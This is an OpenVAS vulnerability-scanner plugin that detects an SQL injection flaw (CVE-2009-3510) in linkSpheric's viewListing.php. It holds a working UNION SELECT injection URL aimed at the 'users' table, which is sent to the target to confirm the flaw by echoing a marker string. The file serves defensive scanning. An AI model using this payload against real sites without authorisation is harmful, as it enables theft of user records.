###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_linkspheric_viewlisting_sql_inj_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# linkSpheric 'viewListing.php' SQL Injection Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow execution of arbitrary SQL commands in
  the affected application.
  Impact Level: Application";
tag_affected = "linkSpheric version 0.74 Beta 6 and prior.";
tag_insight = "The flaw is due to error in viewListing.php which can be exploited to cause
  SQL injection via the 'listID' parameter.";
tag_solution = "No solution or patch is available as of 08th October, 2009. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://dataspheric.com/";
tag_summary = "The host is running linkSpheric and is prone to SQL Injection
  vulnerability.";

if(description)
{
  script_id(801113);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-10-08 08:22:29 +0200 (Thu, 08 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-3510");
  script_name("linkSpheric 'viewListing.php' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9316");
  script_xref(name : "URL" , value : "https://launchpad.net/bugs/cve/2009-3510");

  script_description(desc);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_summary("Check through the attack string and version of linkSpheric");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_linkspheric_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

spheric_port = get_http_port(default:80);
if(!spheric_port){
  exit(0);
}

spheric_ver = get_kb_item("www/" + spheric_port + "/linkSpheric");
if(isnull(spheric_ver)){
  exit(0);
}

spheric_ver = eregmatch(pattern:"^(.+) under (/.*)$", string:spheric_ver);
if(!isnull(spheric_ver[2]) && !safe_checks())
{
  url = string(spheric_ver[2], "/viewListing.php?listID=-5+union+select+1,2," +
               "3,4,5,6,7,8,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54" +
               "657374,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27" +
               ",28+from+users--");

  sndReq = http_get(item:url, port:spheric_port);
  rcvRes = http_send_recv(port:spheric_port, data:sndReq);

  if(egrep(pattern: "OpenVAS-SQL-Injection-Test", string:rcvRes))
  {
    security_hole(spheric_port);
    exit(0);
  }
}
else
{
  if(spheric_ver[1] != NULL)
  {
    if(version_is_less_equal(version:spheric_ver[1], test_version:"0.74.Beta.6")){
       security_hole(spheric_port);
    }
  }
}
